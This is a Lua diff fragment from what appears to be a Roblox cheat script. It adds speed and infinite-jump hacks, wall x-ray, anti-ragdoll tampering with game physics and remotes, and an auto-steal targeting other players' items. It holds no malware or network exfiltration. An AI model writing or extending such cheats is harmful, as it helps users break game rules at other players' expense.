+    local restoreBtn = Instance.new("TextButton")
+    restoreBtn.Size = UDim2.new(0, 110, 0, 34)
+    restoreBtn.Position = UDim2.new(0, 10, 1, -44)
+    restoreBtn.BackgroundColor3 = Theme.SurfaceHighlight
+    restoreBtn.Text = labelText or "OPEN"
+    restoreBtn.Font = Enum.Font.GothamBold
+    restoreBtn.TextSize = 12
+    restoreBtn.TextColor3 = Theme.TextPrimary
+    restoreBtn.Visible = false
+    restoreBtn.AutoButtonColor = false
+    restoreBtn.Parent = guiParent
+    Instance.new("UICorner", restoreBtn).CornerRadius = UDim.new(0, 10)
+    MakeDraggable(restoreBtn, restoreBtn)
+    minimizeBtn.MouseButton1Click:Connect(function()
+        frame.Visible = false
+        restoreBtn.Visible = true
+    end)
+    restoreBtn.MouseButton1Click:Connect(function()
+        frame.Visible = true
+        restoreBtn.Visible = false
+    end)
+end
+
+local function ShowNotification(title, text) end
+
+local function isPlayerCharacter(model)
+    return Players:GetPlayerFromCharacter(model) ~= nil
+end
+
+local function handleAnimator(animator)
+    local model = animator:FindFirstAncestorOfClass("Model")
+    if model and isPlayerCharacter(model) then return end
+    for _, track in pairs(animator:GetPlayingAnimationTracks()) do track:Stop(0) end
+    animator.AnimationPlayed:Connect(function(track) track:Stop(0) end)
+end
+
+local function stripVisuals(obj)
+    local model = obj:FindFirstAncestorOfClass("Model")
+    local isPlayer = model and isPlayerCharacter(model)
+
+    if obj:IsA("Animator") then handleAnimator(obj) end
+
+    if obj:IsA("Accessory") or obj:IsA("Clothing") then
+        if obj:FindFirstAncestorOfClass("Model") then
+            obj:Destroy()
+        end
+    end
+
+    if not isPlayer then
+        if obj:IsA("ParticleEmitter") or obj:IsA("Trail") or obj:IsA("Beam") or 
+           obj:IsA("Smoke") or obj:IsA("Fire") or obj:IsA("Sparkles") or 
+           obj:IsA("Highlight") then
+            obj.Enabled = false
+        end
+        if obj:IsA("Explosion") then
+            obj:Destroy()
+        end
+        if obj:IsA("MeshPart") then
+            obj.TextureID = ""
+        end
+    end
+
+    if obj:IsA("BasePart") then
+        obj.Material = Enum.Material.Plastic
+        obj.Reflectance = 0
+        obj.CastShadow = false
+    end
+
+    if obj:IsA("SurfaceAppearance") or obj:IsA("Texture") or obj:IsA("Decal") then
+        obj:Destroy()
+    end
+end
+
+local fpsBoostState = {
+    enabled = false,
+    original = nil,
+    effectStates = {},
+    atmosphereStates = {},
+    descendantConn = nil,
+}
+
+local function setFPSBoost(enabled)
+    Config.FPSBoost = enabled
+    SaveConfig()
+    if enabled then
+        if not fpsBoostState.original then
+            fpsBoostState.original = {
+                GlobalShadows = Lighting.GlobalShadows,
+                FogEnd = Lighting.FogEnd,
+                FogStart = Lighting.FogStart,
+                EnvironmentDiffuseScale = Lighting.EnvironmentDiffuseScale,
+                EnvironmentSpecularScale = Lighting.EnvironmentSpecularScale,
+                Brightness = Lighting.Brightness,
+                ClockTime = Lighting.ClockTime,
+                Ambient = Lighting.Ambient,
+                OutdoorAmbient = Lighting.OutdoorAmbient,
+            }
+        end
+
+        pcall(function() if setfpscap then setfpscap(9999) end end)
+        Lighting.GlobalShadows = false
+        Lighting.FogEnd = 1000000
+        Lighting.FogStart = 0
+        Lighting.EnvironmentDiffuseScale = 0
+        Lighting.EnvironmentSpecularScale = 0
+        Lighting.Brightness = 1
+        
+        fpsBoostState.effectStates = {}
+        fpsBoostState.atmosphereStates = {}
+        for _, v in ipairs(Lighting:GetChildren()) do
+            if v:IsA("BloomEffect") or v:IsA("BlurEffect") or v:IsA("ColorCorrectionEffect") or 
+               v:IsA("SunRaysEffect") or v:IsA("DepthOfFieldEffect") then
+                fpsBoostState.effectStates[v] = v.Enabled
+                v.Enabled = false
+            elseif v:IsA("Atmosphere") then
+                fpsBoostState.atmosphereStates[v] = {
+                    Density = v.Density,
+                    Haze = v.Haze,
+                    Glare = v.Glare,
+                }
+                v.Density = 0
+                v.Haze = 0
+                v.Glare = 0
+            end
+        end
+
+        for _, obj in ipairs(Workspace:GetDescendants()) do
+            stripVisuals(obj)
+        end
+
+        if fpsBoostState.descendantConn then
+            fpsBoostState.descendantConn:Disconnect()
+            fpsBoostState.descendantConn = nil
+        end
+        fpsBoostState.descendantConn = Workspace.DescendantAdded:Connect(function(obj)
+            if fpsBoostState.enabled then
+                stripVisuals(obj)
+            end
+        end)
+        fpsBoostState.enabled = true
+    else
+        fpsBoostState.enabled = false
+        if fpsBoostState.descendantConn then
+            fpsBoostState.descendantConn:Disconnect()
+            fpsBoostState.descendantConn = nil
+        end
+        if fpsBoostState.original then
+            local o = fpsBoostState.original
+            Lighting.GlobalShadows = o.GlobalShadows
+            Lighting.FogEnd = o.FogEnd
+            Lighting.FogStart = o.FogStart
+            Lighting.EnvironmentDiffuseScale = o.EnvironmentDiffuseScale
+            Lighting.EnvironmentSpecularScale = o.EnvironmentSpecularScale
+            Lighting.Brightness = o.Brightness
+            Lighting.ClockTime = o.ClockTime
+            Lighting.Ambient = o.Ambient
+            Lighting.OutdoorAmbient = o.OutdoorAmbient
+        end
+        for inst, wasEnabled in pairs(fpsBoostState.effectStates) do
+            if inst and inst.Parent then
+                inst.Enabled = wasEnabled
+                    end
+                end
+        for inst, state in pairs(fpsBoostState.atmosphereStates) do
+            if inst and inst.Parent and state then
+                inst.Density = state.Density
+                inst.Haze = state.Haze
+                inst.Glare = state.Glare
+            end
+        end
+        fpsBoostState.effectStates = {}
+        fpsBoostState.atmosphereStates = {}
+            end
+        end
+if Config.FPSBoost then task.spawn(function() task.wait(1); setFPSBoost(true) end) end
+local State = {
+    ProximityAPActive = false,
+    carpetSpeedEnabled = false,
+    infiniteJumpEnabled = Config.TpSettings.InfiniteJump,
+    xrayEnabled = false,
+    antiRagdollMode = Config.AntiRagdoll or 0,
+    isTpMoving = false,
+    manualTargetEnabled = false,
+}
+local Connections = {
+    carpetSpeedConnection = nil,
+    infiniteJumpConnection = nil,
+    _ijInputBegan = nil,
+    _ijInputEnded = nil,
+    xrayDescConn = nil,
+    antiRagdollConn = nil,
+    antiRagdollV2Task = nil,
+}
+local UI = {
+    carpetStatusLabel = nil,
+    settingsGui = nil,
+}
+local carpetSpeedEnabled = State.carpetSpeedEnabled
+local carpetSpeedConnection = Connections.carpetSpeedConnection
+local _carpetStatusLabel = UI.carpetStatusLabel
+
+local function setCarpetSpeed(enabled)
+    State.carpetSpeedEnabled = enabled
+    carpetSpeedEnabled = State.carpetSpeedEnabled
+    if Connections.carpetSpeedConnection then Connections.carpetSpeedConnection:Disconnect(); Connections.carpetSpeedConnection = nil end
+    carpetSpeedConnection = Connections.carpetSpeedConnection
+    if not enabled then return end
+
+    if SharedState.DisableStealSpeed then SharedState.DisableStealSpeed() end
+
+    Connections.carpetSpeedConnection = RunService.Heartbeat:Connect(function()
+    carpetSpeedConnection = Connections.carpetSpeedConnection
+        local c = LocalPlayer.Character
+        if not c then return end
+        local hum = c:FindFirstChild("Humanoid")
+        local hrp = c:FindFirstChild("HumanoidRootPart")
+        if not hum or not hrp then return end
+
+        local toolName = Config.TpSettings.Tool
+        local hasTool = c:FindFirstChild(toolName)
+        
+        if not hasTool then
+            local tb = LocalPlayer.Backpack:FindFirstChild(toolName)
+            if tb then hum:EquipTool(tb) end
+        end
+
+        if hasTool then
+            local md = hum.MoveDirection
+            if md.Magnitude > 0 then
+                hrp.AssemblyLinearVelocity = Vector3.new(
+                    md.X * 140, 
+                    hrp.AssemblyLinearVelocity.Y, 
+                    md.Z * 140
+                )
+            else
+                hrp.AssemblyLinearVelocity = Vector3.new(0, hrp.AssemblyLinearVelocity.Y, 0)
+            end
+        end
+    end)
+end
+
+local infiniteJumpEnabled = State.infiniteJumpEnabled
+local infiniteJumpConnection = Connections.infiniteJumpConnection
+
+local function setInfiniteJump(enabled)
+    State.infiniteJumpEnabled = enabled
+    infiniteJumpEnabled = State.infiniteJumpEnabled
+    Config.TpSettings.InfiniteJump = enabled
+    SaveConfig()
+    if Connections.infiniteJumpConnection then Connections.infiniteJumpConnection:Disconnect(); Connections.infiniteJumpConnection = nil end
+    if Connections._ijInputBegan then Connections._ijInputBegan:Disconnect(); Connections._ijInputBegan = nil end
+    if Connections._ijInputEnded then Connections._ijInputEnded:Disconnect(); Connections._ijInputEnded = nil end
+    infiniteJumpConnection = Connections.infiniteJumpConnection
+    if not enabled then return end
+
+    local isSpaceHeld = false
+    local inputBegan = UserInputService.InputBegan:Connect(function(input, gp)
+        if gp then return end
+        if input.KeyCode == Enum.KeyCode.Space then isSpaceHeld = true end
+    end)
+    local inputEnded = UserInputService.InputEnded:Connect(function(input)
+        if input.KeyCode == Enum.KeyCode.Space then isSpaceHeld = false end
+    end)
+    Connections.infiniteJumpConnection = RunService.RenderStepped:Connect(function()
+    infiniteJumpConnection = Connections.infiniteJumpConnection
+        if not isSpaceHeld then return end
+        local char = LocalPlayer.Character
+        if not char then return end
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        local hum = char:FindFirstChild("Humanoid")
+        if not hrp or not hum or hum.Health <= 0 then return end
+        hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, 50, hrp.AssemblyLinearVelocity.Z)
+    end)
+    Connections._ijInputBegan = inputBegan
+    Connections._ijInputEnded = inputEnded
+end
+if infiniteJumpEnabled then setInfiniteJump(true) end
+
+local XrayState = {
+    originalTransparency = {},
+    xrayEnabled = false,
+}
+local originalTransparency = XrayState.originalTransparency
+local xrayEnabled = XrayState.xrayEnabled
+
+local function isBaseWall(obj)
+    if not obj:IsA("BasePart") then return false end
+    local name = obj.Name:lower()
+    local parentName = (obj.Parent and obj.Parent.Name:lower()) or ""
+    return name:find("base") or parentName:find("base")
+end
+
+local function enableXray()
+    XrayState.xrayEnabled = true
+    xrayEnabled = XrayState.xrayEnabled
+    do
+        local descendants = Workspace:GetDescendants()
+        for i = 1, #descendants do
+            local obj = descendants[i]
+            if obj:IsA("BasePart") and obj.Anchored and isBaseWall(obj) then
+                XrayState.originalTransparency[obj] = obj.LocalTransparencyModifier
+                originalTransparency[obj] = XrayState.originalTransparency[obj]
+                obj.LocalTransparencyModifier = 0.85
+            end
+        end
+    end
+end
+
+local xrayDescConn = Connections.xrayDescConn
+local function disableXray()
+    XrayState.xrayEnabled = false
+    xrayEnabled = XrayState.xrayEnabled
+    if Connections.xrayDescConn then Connections.xrayDescConn:Disconnect(); Connections.xrayDescConn = nil end
+    xrayDescConn = Connections.xrayDescConn
+    for part, val in pairs(XrayState.originalTransparency) do
+        if part and part.Parent then part.LocalTransparencyModifier = val end
+    end
+    XrayState.originalTransparency = {}
+    originalTransparency = XrayState.originalTransparency
+end
+
+if Config.XrayEnabled then
+    enableXray()
+    Connections.xrayDescConn = Workspace.DescendantAdded:Connect(function(obj)
+        if XrayState.xrayEnabled and obj:IsA("BasePart") and obj.Anchored and isBaseWall(obj) then
+            XrayState.originalTransparency[obj] = obj.LocalTransparencyModifier
+            originalTransparency[obj] = XrayState.originalTransparency[obj]
+            obj.LocalTransparencyModifier = 0.85
+        end
+    end)
+    xrayDescConn = Connections.xrayDescConn
+end
+
+local antiRagdollMode = State.antiRagdollMode
+local antiRagdollConn = Connections.antiRagdollConn
+
+local function isRagdolled()
+    local char = LocalPlayer.Character; if not char then return false end
+    local hum = char:FindFirstChildOfClass("Humanoid"); if not hum then return false end
+    local state = hum:GetState()
+    local ragStates = {
+        [Enum.HumanoidStateType.Physics]     = true,
+        [Enum.HumanoidStateType.Ragdoll]     = true,
+        [Enum.HumanoidStateType.FallingDown] = true,
+    }
+    if ragStates[state] then return true end
+    local endTime = LocalPlayer:GetAttribute("RagdollEndTime")
+    if endTime and (endTime - Workspace:GetServerTimeNow()) > 0 then return true end
+    return false
+end
+
+local function stopAntiRagdoll()
+    if Connections.antiRagdollConn then Connections.antiRagdollConn:Disconnect(); Connections.antiRagdollConn = nil end
+    antiRagdollConn = Connections.antiRagdollConn
+end
+
+
+local function startAntiRagdoll(mode)
+    stopAntiRagdoll()
+    if Config.AntiRagdollV2 then
+        stopAntiRagdollV2()
+    end
+    if mode == 0 then return end
+
+    Connections.antiRagdollConn = RunService.Heartbeat:Connect(function()
+    antiRagdollConn = Connections.antiRagdollConn
+        local char = LocalPlayer.Character; if not char then return end
+        local hum = char:FindFirstChildOfClass("Humanoid")
+        local hrp = char:FindFirstChild("HumanoidRootPart")
+        if not hum or not hrp then return end
+
+        if isRagdolled() then
+            pcall(function() LocalPlayer:SetAttribute("RagdollEndTime", Workspace:GetServerTimeNow()) end)
+            hum:ChangeState(Enum.HumanoidStateType.Running)
+            hrp.AssemblyLinearVelocity = Vector3.zero
+            if Workspace.CurrentCamera.CameraSubject ~= hum then
+                Workspace.CurrentCamera.CameraSubject = hum
+            end
+            for _, obj in ipairs(char:GetDescendants()) do
+                if obj:IsA("BallSocketConstraint") or obj.Name:find("RagdollAttachment") then
+                    pcall(function() obj:Destroy() end)
+                end
+            end
+        end
+    end)
+end
+
+local AntiRagdollV2Data = {
+    antiRagdollConns = {},
+}
+local antiRagdollConns = AntiRagdollV2Data.antiRagdollConns
+
+local cleanRagdollV2Scheduled = false
+local function cleanRagdollV2(char)
+    if not char then return end
+    local carpetEquipped = false
+    pcall(function()
+        local toolName = Config.TpSettings.Tool or "Flying Carpet"
+        local tool = char:FindFirstChild(toolName)
+        if tool then
+            local hrp = char:FindFirstChild("HumanoidRootPart")
+            if hrp then
+                for _, obj in ipairs(hrp:GetChildren()) do
+                    if obj:IsA("BodyVelocity") or obj:IsA("BodyPosition") or obj:IsA("BodyGyro") then
+                        carpetEquipped = true
+                        break
+                    end
+                end
+            end
+            if not carpetEquipped then
+                for _, obj in ipairs(tool:GetChildren()) do
+                    if obj:IsA("BodyVelocity") or obj:IsA("BodyPosition") or obj:IsA("BodyGyro") then
+                        carpetEquipped = true
+                        break
+                    end
+                end
+            end
+        end
+    end)
+    local descendants = char:GetDescendants()
+    for _, d in ipairs(descendants) do
+        if d:IsA("BallSocketConstraint") or d:IsA("NoCollisionConstraint")
+            or d:IsA("HingeConstraint")
+            or (d:IsA("Attachment") and (d.Name == "A" or d.Name == "B")) then
+            d:Destroy()
+        elseif (d:IsA("BodyVelocity") or d:IsA("BodyPosition") or d:IsA("BodyGyro")) and not carpetEquipped then
+            d:Destroy()
+        end
+    end
+    for _, d in ipairs(descendants) do
+        if d:IsA("Motor6D") then d.Enabled = true end
+    end
+    local hum = char:FindFirstChildOfClass("Humanoid")
+    if hum then
+        local animator = hum:FindFirstChild("Animator")
+        if animator then
+            for _, track in ipairs(animator:GetPlayingAnimationTracks()) do
+                local n = track.Animation and track.Animation.Name:lower() or ""
+                if n:find("rag") or n:find("fall") or n:find("hurt") or n:find("down") then
+                    track:Stop(0)
+                end
+            end
+        end
+    end
+    task.defer(function()
+        pcall(function()
+            local pm = LocalPlayer:FindFirstChild("PlayerScripts")
+            if pm then pm = pm:FindFirstChild("PlayerModule") end
+            if pm then require(pm):GetControls():Enable() end
+        end)
+    end)
+end
+local function cleanRagdollV2Debounced(char)
+    if cleanRagdollV2Scheduled then return end
+    cleanRagdollV2Scheduled = true
+    task.defer(function()
+        cleanRagdollV2Scheduled = false
+        if char and char.Parent then cleanRagdollV2(char) end
+    end)
+end
+local function isRagdollRelatedDescendant(obj)
+    if obj:IsA("BallSocketConstraint") or obj:IsA("NoCollisionConstraint") or obj:IsA("HingeConstraint") then return true end
+    if obj:IsA("Attachment") and (obj.Name == "A" or obj.Name == "B") then return true end
+    if obj:IsA("BodyVelocity") or obj:IsA("BodyPosition") or obj:IsA("BodyGyro") then return true end
+    return false
+end
+
+local function hookAntiRagV2(char)
+    for _, c in ipairs(antiRagdollConns) do pcall(function() c:Disconnect() end) end
+    AntiRagdollV2Data.antiRagdollConns = {}
+    antiRagdollConns = AntiRagdollV2Data.antiRagdollConns
+
+    local hum = char:WaitForChild("Humanoid", 10)
+    local hrp = char:WaitForChild("HumanoidRootPart", 10)
+    if not hum or not hrp then return end
+
+    local lastVel = Vector3.new(0, 0, 0)
+
+    local c1 = hum.StateChanged:Connect(function()
+        local st = hum:GetState()
+        if st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll
+            or st == Enum.HumanoidStateType.FallingDown or st == Enum.HumanoidStateType.GettingUp then
+            local carpetActive = false
+            pcall(function()
+                local toolName = Config.TpSettings.Tool or "Flying Carpet"
+                local tool = char:FindFirstChild(toolName)
+                if tool and hrp then
+                    for _, obj in ipairs(hrp:GetChildren()) do
+                        if obj:IsA("BodyVelocity") or obj:IsA("BodyPosition") or obj:IsA("BodyGyro") then
+                            carpetActive = true
+                        end
+                    end
+                end
+            end)
+            if not carpetActive then
+                hum:ChangeState(Enum.HumanoidStateType.Running)
+            end
+            cleanRagdollV2(char)
+            pcall(function() Workspace.CurrentCamera.CameraSubject = hum end)
+            pcall(function()
+                local pm = LocalPlayer:FindFirstChild("PlayerScripts")
+                if pm then pm = pm:FindFirstChild("PlayerModule") end
+                if pm then require(pm):GetControls():Enable() end
+            end)
+        end
+    end)
+    table.insert(antiRagdollConns, c1)
+
+    local c2 = char.DescendantAdded:Connect(function(desc)
+        if isRagdollRelatedDescendant(desc) then
+            cleanRagdollV2Debounced(char)
+        end
+    end)
+    table.insert(antiRagdollConns, c2)
+
+    pcall(function()
+        local pkg = ReplicatedStorage:FindFirstChild("Packages")
+        if pkg then
+            local net = pkg:FindFirstChild("Net")
+            if net then
+                local applyImp = net:FindFirstChild("RE/CombatService/ApplyImpulse")
+                if applyImp and applyImp:IsA("RemoteEvent") then
+                    local c3 = applyImp.OnClientEvent:Connect(function()
+                        local st = hum:GetState()
+                        if st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll
+                            or st == Enum.HumanoidStateType.FallingDown or st == Enum.HumanoidStateType.GettingUp then
+                            pcall(function() hrp.AssemblyLinearVelocity = Vector3.new(0, 0, 0) end)
+                        end
+                    end)
+                    table.insert(antiRagdollConns, c3)
+                end
+            end
+        end
+    end)
+
+    local c4 = RunService.Heartbeat:Connect(function()
+        local st = hum:GetState()
+        if st == Enum.HumanoidStateType.Physics or st == Enum.HumanoidStateType.Ragdoll
+            or st == Enum.HumanoidStateType.FallingDown or st == Enum.HumanoidStateType.GettingUp then
+            cleanRagdollV2(char)
+            local vel = hrp.AssemblyLinearVelocity
+            if (vel - lastVel).Magnitude > 40 and vel.Magnitude > 25 then
+                hrp.AssemblyLinearVelocity = vel.Unit * math.min(vel.Magnitude, 15)
+            end
+        end
+        lastVel = hrp.AssemblyLinearVelocity
+    end)
+    table.insert(antiRagdollConns, c4)
+
+    cleanRagdollV2(char)
+end
+
+local function stopAntiRagdollV2()
+    cleanRagdollV2Scheduled = false
+    for _, c in ipairs(antiRagdollConns) do pcall(function() c:Disconnect() end) end
+    AntiRagdollV2Data.antiRagdollConns = {}
+    antiRagdollConns = AntiRagdollV2Data.antiRagdollConns
+end
+
+local function startAntiRagdollV2(enabled)
+    stopAntiRagdoll()
+    stopAntiRagdollV2()
+    if not enabled then
+        return
+    end
+
+    local char = LocalPlayer.Character
+    if char then task.spawn(function() hookAntiRagV2(char) end) end
+    LocalPlayer.CharacterAdded:Connect(function(c)
+        task.spawn(function() hookAntiRagV2(c) end)
+    end)
+end
+
+if antiRagdollMode > 0 then startAntiRagdoll(antiRagdollMode) end
+Config.AntiRagdollV2 = true
+startAntiRagdollV2(true)
+if Config.AntiRagdollV2 then startAntiRagdollV2(true) end
+
+do
+    local plotBeam = nil
+    local plotBeamAttachment0 = nil
+    local plotBeamAttachment1 = nil
+
+    local function findMyPlot()
+        local plots = workspace:FindFirstChild("Plots")
+        if not plots then return nil end
+        for _, plot in ipairs(plots:GetChildren()) do
+            local sign = plot:FindFirstChild("PlotSign")
+            if sign then
+                local surfaceGui = sign:FindFirstChildWhichIsA("SurfaceGui", true)
+                if surfaceGui then
+                    local label = surfaceGui:FindFirstChildWhichIsA("TextLabel", true)
+                    if label then
+                        local text = label.Text:lower()
+                        if text:find(LocalPlayer.DisplayName:lower(), 1, true) or text:find(LocalPlayer.Name:lower(), 1, true) then
+                            return plot
+                        end
+                    end
+                end
+            end
+        end
+        return nil
+    end
+
+    local function createPlotBeam()
+        if not Config.LineToBase then return end
+        local myPlot = findMyPlot()
+        if not myPlot or not myPlot.Parent then return end
+        local character = LocalPlayer.Character
+        if not character or not character.Parent then return end
+        local hrp = character:FindFirstChild("HumanoidRootPart")
+        if not hrp or not hrp.Parent then return end
+        if plotBeam then pcall(function() plotBeam:Destroy() end) end
+        if plotBeamAttachment0 then pcall(function() plotBeamAttachment0:Destroy() end) end
+        plotBeamAttachment0 = hrp:FindFirstChild("PlotBeamAttach_Player") or Instance.new("Attachment")
+        plotBeamAttachment0.Name = "PlotBeamAttach_Player"
+        plotBeamAttachment0.Position = Vector3.new(0, 0, 0)
+        plotBeamAttachment0.Parent = hrp
+        local plotPart = myPlot:FindFirstChild("MainRootPart") or myPlot:FindFirstChildWhichIsA("BasePart")
+        if not plotPart or not plotPart.Parent then return end
+        plotBeamAttachment1 = plotPart:FindFirstChild("PlotBeamAttach_Plot") or Instance.new("Attachment")
+        plotBeamAttachment1.Name = "PlotBeamAttach_Plot"
+        plotBeamAttachment1.Position = Vector3.new(0, 5, 0)
+        plotBeamAttachment1.Parent = plotPart
+        plotBeam = hrp:FindFirstChild("PlotBeam") or Instance.new("Beam")
+        plotBeam.Name = "PlotBeam"
+        plotBeam.Attachment0 = plotBeamAttachment0
+        plotBeam.Attachment1 = plotBeamAttachment1
+        plotBeam.FaceCamera = true
+        plotBeam.LightEmission = 1
+        plotBeam.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255))
+        plotBeam.Transparency = NumberSequence.new(0)
+        plotBeam.Width0 = 0.7
+        plotBeam.Width1 = 0.7
+        plotBeam.TextureMode = Enum.TextureMode.Wrap
+        plotBeam.TextureSpeed = 0
+        plotBeam.Parent = hrp
+    end
+
+    local function resetPlotBeam()
+        if plotBeam then pcall(function() plotBeam:Destroy() end) end
+        if plotBeamAttachment0 then pcall(function() plotBeamAttachment0:Destroy() end) end
+        if plotBeamAttachment1 then pcall(function() plotBeamAttachment1:Destroy() end) end
+        plotBeam = nil
+        plotBeamAttachment0 = nil
+        plotBeamAttachment1 = nil
+    end
+
+    task.spawn(function()
+        local checkCounter = 0
+        RunService.Heartbeat:Connect(function()
+            if not Config.LineToBase then return end
+            checkCounter = checkCounter + 1
+            if checkCounter >= 30 then
+                checkCounter = 0
+                if not plotBeam or not plotBeam.Parent or not plotBeamAttachment0 or not plotBeamAttachment0.Parent then
+                    pcall(createPlotBeam)
+                end
+            end
+        end)
+    end)
+
+    LocalPlayer.CharacterAdded:Connect(function(character)
+        task.wait(0.5)
+        if Config.LineToBase and character then
+            pcall(createPlotBeam)
+        end
+    end)
+
+    if LocalPlayer.Character then
+        task.spawn(function()
+            task.wait(0.2)
+            if Config.LineToBase then createPlotBeam() end
+        end)
+    end
+
+    _G.createPlotBeam = createPlotBeam
+    _G.resetPlotBeam = resetPlotBeam
+end
+
+task.spawn(function()
+    local Packages = ReplicatedStorage:WaitForChild("Packages")
+    local Datas    = ReplicatedStorage:WaitForChild("Datas")
+    local Shared   = ReplicatedStorage:WaitForChild("Shared")
+    local Utils    = ReplicatedStorage:WaitForChild("Utils")
+
+    local Synchronizer  = require(Packages:WaitForChild("Synchronizer"))
+    local AnimalsData   = require(Datas:WaitForChild("Animals"))
+    local AnimalsShared = require(Shared:WaitForChild("Animals"))
+    local NumberUtils   = require(Utils:WaitForChild("NumberUtils"))
+
+    local autoStealEnabled   = true
+    
+    
+    if Config.DefaultToPriority and Config.DefaultToHighest then
+        Config.DefaultToHighest = false
+    end
+    if Config.DefaultToPriority and Config.DefaultToNearest then
+        Config.DefaultToNearest = false
+    end
+    if Config.DefaultToHighest and Config.DefaultToNearest then
+        Config.DefaultToNearest = false
+    end
+    
+    if not Config.DefaultToPriority and not Config.DefaultToHighest and not Config.DefaultToNearest and not Config.DefaultToDisable then
+        Config.DefaultToHighest = true
+    end
+    
+    local stealNearestEnabled = false
+    local stealHighestEnabled = false
+    local stealPriorityEnabled = false
+    
+    if Config.DefaultToNearest then
+        stealNearestEnabled = true
+        Config.StealNearest = true
+        Config.StealHighest = false
+        Config.StealPriority = false
+        Config.AutoTPPriority = true
+    elseif Config.DefaultToHighest then
+        stealHighestEnabled = true
+        Config.StealHighest = true
+        Config.StealNearest = false
+        Config.StealPriority = false
+        Config.AutoTPPriority = false
+    elseif Config.DefaultToPriority then
+        stealPriorityEnabled = true
+        Config.StealPriority = true
+        Config.StealNearest = false
+        Config.StealHighest = false
+        Config.AutoTPPriority = true
+    elseif Config.DefaultToDisable then
+        -- Disable mode: don't activate any steal mode on load
+        stealNearestEnabled = false
+        stealHighestEnabled = false
+        stealPriorityEnabled = false
+        Config.StealNearest = false
+        Config.StealHighest = false
+        Config.StealPriority = false
+    else
+        stealNearestEnabled = Config.StealNearest
+        stealHighestEnabled = Config.StealHighest
+        stealPriorityEnabled = Config.StealPriority
+        
+        if Config.InstantSteal == nil then Config.InstantSteal = false end
+        if Config.StealPriority then
+            Config.AutoTPPriority = true
+        elseif Config.StealNearest then
+            Config.AutoTPPriority = true
+        elseif Config.StealHighest then
+            Config.AutoTPPriority = false
+        end
+    end
+    
+    local instantStealEnabled = true
+    local instantStealReady = false
+    local instantStealDidInit = false
+    local selectedTargetIndex = 1
+    local selectedTargetUID   = nil 
+    local allAnimalsCache    = {}
+    local InternalStealCache = {}
+    local PromptMemoryCache  = {}
+    local activeProgressTween = nil
+    local currentStealTargetUID = nil
+    local petButtons         = {}
+    local ShowPriorityAlert = function() end
+
+    -- ── STEAL REMOTE RESOLVER ─────────────────────────────────────────────
+    -- Resolved once and cached. Used in all steal paths for maximum speed.
+    
+    local function isMyBaseAnimal(animalData)
+        if not animalData or not animalData.plot then return false end
+        local plots = Workspace:FindFirstChild("Plots")
+        if not plots then return false end
+        local plot = plots:FindFirstChild(animalData.plot)
+        if not plot then return false end
+        local channel = Synchronizer:Get(plot.Name)
+        if channel then
+            local owner = channel:Get("Owner")
+            if owner then
+                if typeof(owner) == "Instance" and owner:IsA("Player") then return owner.UserId == LocalPlayer.UserId
+                elseif typeof(owner) == "table" and owner.UserId then return owner.UserId == LocalPlayer.UserId
+                elseif typeof(owner) == "Instance" then return owner == LocalPlayer end
+            end
+        end
+        return false
+    end
+    
+    local function formatMutationText(mutationName)
+        if not mutationName or mutationName == "None" then return "" end
+        local f = ""
+        if mutationName == "Cursed" then f = "<font color='rgb(200,0,0)'>Cur</font><font color='rgb(0,0,0)'>sed</font>"
+        elseif mutationName == "Gold" then f = "<font color='rgb(255,215,0)'>Gold</font>"
+        elseif mutationName == "Diamond" then f = "<font color='rgb(0,255,255)'>Diamond</font>"
+        elseif mutationName == "YinYang" then f = "<font color='rgb(255,255,255)'>Yin</font><font color='rgb(0,0,0)'>Yang</font>"
+        elseif mutationName == "Candy" then f = "<font color='rgb(255,105,180)'>Candy</font>"
+        elseif mutationName == "Divine" then f = "<font color='rgb(255,255,255)'>Divine</font>"
+        elseif mutationName == "Rainbow" then
+            local cols = {"rgb(255,0,0)","rgb(255,127,0)","rgb(255,255,0)","rgb(0,255,0)","rgb(0,0,255)","rgb(75,0,130)","rgb(148,0,211)"}
+            for i = 1, #mutationName do f = f.."<font color='"..cols[(i-1)%#cols+1].."'>"..mutationName:sub(i,i).."</font>" end
+        else f = mutationName end
+        return "<font weight='800'>"..f.." </font>"
+    end
+
+    -- With inline controls hidden, keep auto-steal active by default.
+    if Config.DefaultToDisable then
+        Config.DefaultToDisable = false
+        SaveConfig()
+    end
+
+    -- Safety: if all modes are OFF, fall back to Highest.
+    if not stealNearestEnabled and not stealHighestEnabled and not stealPriorityEnabled then
+        stealHighestEnabled = true
+        Config.StealNearest = false
+        Config.StealHighest = true
+        Config.StealPriority = false
+        SaveConfig()
+    end
+
+    local function get_all_pets()
+        local out = {}
+        for _, a in ipairs(allAnimalsCache) do
+            if a.genValue >= 1 and not isMyBaseAnimal(a) then
+                table.insert(out, {petName=a.name, mpsText=a.genText, mpsValue=a.genValue,
+                    owner=a.owner, plot=a.plot, slot=a.slot, uid=a.uid, mutation=a.mutation, animalData=a, source="CARPET"})
+            end
+        end
+        -- also include conveyor brainrots
+        -- (REMOVED: conveyor detection disabled)
+        return out
+    end
+
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "AutoStealUI"; screenGui.ResetOnSpawn = false; screenGui.Parent = PlayerGui
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 276, 0, 408)
+    frame.Position = UDim2.new(Config.Positions.AutoSteal.X, 0, Config.Positions.AutoSteal.Y, 0)
+    frame.BackgroundColor3 = Theme.Surface; frame.BackgroundTransparency = 0.08
+    frame.BorderSizePixel = 0; frame.ClipsDescendants = true; frame.Parent = screenGui
+    
+    Instance.new("UICorner", frame).CornerRadius = UDim.new(0, 12)
+    for _, d in ipairs(frame:GetDescendants()) do
+        if d:IsA("UIStroke") and (d.Name == "RacetrackBorder" or d.Parent == frame) then
+            d:Destroy()
+        end
+    end
+    if addRacetrackBorder then addRacetrackBorder(frame, Theme.Accent1, 2.6) end
+    
+    local header = Instance.new("Frame", frame); header.Size = UDim2.new(1,0,0,14); header.BackgroundTransparency = 1
+    MakeDraggable(header, frame, "AutoSteal") 
+    local titleLabel = Instance.new("TextLabel", header)
+    titleLabel.Size = UDim2.new(0.6,0,1,0)
+    titleLabel.Position = UDim2.new(0,15,0,0)
+    titleLabel.BackgroundTransparency = 1; titleLabel.Text = ""
+    titleLabel.Font = Enum.Font.GothamBlack; titleLabel.TextSize = 16
